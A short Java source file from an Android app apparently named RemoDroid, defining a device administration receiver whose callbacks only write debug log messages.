package com.remo.features.broadcastReceivers;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class DeviceAdmin extends DeviceAdminReceiver {
    public void onDisabled(Context context, Intent intent) {
        Log.d("REMODROID","DeviceAdmin Disabled");
    }

    public void onEnabled(Context context, Intent intent) {
        Log.d("REMODROID","DeviceAdmin Enabled");
    }

    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
        Log.d("REMODROID","DeviceAdmin onReceive");
    }
}
